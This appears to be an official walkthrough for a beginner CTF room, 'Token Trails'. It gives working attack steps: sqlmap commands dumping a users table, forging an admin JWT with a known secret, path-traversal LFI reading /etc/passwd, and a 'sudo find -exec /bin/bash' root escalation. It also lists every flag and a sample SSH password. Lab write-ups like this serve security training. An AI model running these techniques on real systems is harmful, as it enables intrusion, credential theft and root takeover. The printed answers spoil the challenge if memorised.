
# 🧠 Token Trails – Official Write-Up

> Welcome to **Token Trails**, a beginner-to-intermediate level CTF room focused on web exploitation, token manipulation, and privilege escalation.

---

## 📜 Overview

- **Room Name:** Token Trails  
- **Difficulty:** Easy–Medium  
- **Platform:** Ubuntu (Web + SSH)  
- **Focus Areas:** Recon, SQLi, JWT, LFI, Linux Privilege Escalation  

---

## 🔍 Task 1: View Page Source

Navigate to the homepage at `/index.php`.  
Right-click > View Page Source.

🔐 **Flag:**  
FLAG{web_source_master}


---

## 💉 Task 2: SQL Injection – Credential Leak

The login form on `/login.php` is vulnerable to SQL injection.

### 🔍 Tool:
Use **SQLMap** to enumerate the database and extract user credentials.


sqlmap -u "http://<ip>/token_trails/login.php?username=test" --dbs
sqlmap -u "http://<ip>/token_trails/login.php?username=test" -D ctf -T users --dump

🔐 Task 3: JWT Manipulation – Trust Issues
The server sets a JWT token in the auth cookie after login.

🔍 Step-by-step:
Decode the JWT using https://jwt.io

Payload:
{ "user": "user" }
Modify to:
{ "user": "admin" }
Secret used: secrettoken

Re-sign the JWT with HS256 and replace your cookie

✅ Flag:
FLAG{jwt_admin_access}
🗂️ Task 4: Local File Inclusion – Source Discovery
The file /include.php has a vulnerable page parameter.

🔍 Exploit:

http://<ip>/token_trails/include.php?page=../../../../etc/passwd
Check internal PHP files:

http://<ip>/token_trails/include.php?page=../../../../var/www/html/token_trails/secret.php
You’ll find the next flag there.

✅ Flag:
FLAG{lfi_pwned_path}


🧑‍💻 Task 5: Privilege Escalation – Finders Keepers
You now have SSH access as ctfplayer.

🔍 Login:

ssh ctfplayer@<ip>
# password: ctfplayer123 (or as configured)
Check for sudo rights:

bash
Copy
Edit
sudo -l
You’ll see:

arduino
(ALL) NOPASSWD: /usr/bin/find
🔓 Privilege Escalation:
Exploit the find binary to get root shell:


sudo find . -exec /bin/bash \;
whoami  # root
🔍 Final Flag:
cat /root/root_flag.txt
✅ Flag:
FLAG{root_access_gained}

